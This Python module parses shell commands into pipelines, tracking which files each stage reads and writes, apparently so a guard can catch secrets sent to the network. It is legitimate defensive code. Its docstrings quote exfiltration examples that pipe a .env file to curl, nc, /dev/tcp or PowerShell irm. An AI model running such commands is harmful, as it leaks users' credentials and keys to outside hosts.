"""Simple commands grouped by the data that flows between them.

`cat .env | curl -d @- x` sends the file although no single command both reads
it and talks to the network, so the key guard looks at whole pipelines, with
the files each stage reads from (`< file`) and writes to (`> /dev/tcp/h/9`).
"""

from __future__ import annotations

from typing import NamedTuple

from shell_words import is_punct, tokens


class Simple(NamedTuple):
    words: list[str]
    inputs: list[str]  # targets of `<`: what the command reads as stdin
    outputs: list[str]  # targets of `>` and `>>`


def _new() -> Simple:
    return Simple([], [], [])


def _redirect_kind(token: str) -> str:
    """`<` reads a file; `<<<` is literal text, `<<` a heredoc and `>&` a stream
    number (`2>&1`), so none of those is a file. `&>` writes both streams to one."""
    if token.startswith("<<") or token.endswith("&"):
        return "text"
    return "<" if token.startswith("<") else ">"


def pipelines(cmd: str, powershell: bool = False) -> list[list[Simple]] | None:
    """Pipelines of the command, each a list of its stages; None if unparseable.

    `|` joins stages. `;`, `&&`, `||`, `&` and newlines start a new pipeline,
    except inside parentheses or braces: `(cat .env; echo) | nc h 9` and
    `irm -Body (gc .env)` are one pipeline each.
    """
    found = tokens(cmd, powershell)
    if found is None:
        return None
    groups: list[list[Simple]] = [[]]
    current, redirect, depth = _new(), "", 0
    for token in found:
        if not is_punct(token) and token not in ("{", "}"):
            target = {"<": current.inputs, ">": current.outputs, "": current.words}
            target.get(redirect, []).append(token)
            redirect = ""
        elif ("<" in token or ">" in token) and not set(token) & set("()"):
            if current.words and current.words[-1].isdigit():
                current.words.pop()  # `2>&1`: the digit is a stream number
            redirect = _redirect_kind(token)
        else:
            groups[-1].append(current)
            current, redirect = _new(), ""
            depth, split = _separator(token, depth)
            if split:
                groups.append([])
            if token.rstrip("&")[-1:] in ("<", ">"):  # `$(< key)`: the lexer glued `(<`
                redirect = _redirect_kind(token.lstrip("();&|\n"))
    groups[-1].append(current)
    return [[s for s in g if s.words or s.inputs or s.outputs] for g in groups if g]


def _separator(token: str, depth: int) -> tuple[int, bool]:
    """(nesting depth after the token, whether it ends a pipeline at depth 0)."""
    split = False
    for i, ch in enumerate(token):
        if ch in "({":
            depth += 1
        elif ch in ")}":
            depth = max(0, depth - 1)
        elif ch in ";\n" or (ch == "&" and token[i - 1 : i] != "|"):
            split = split or depth == 0  # `|&` pipes stderr too, it does not split
    return depth, split
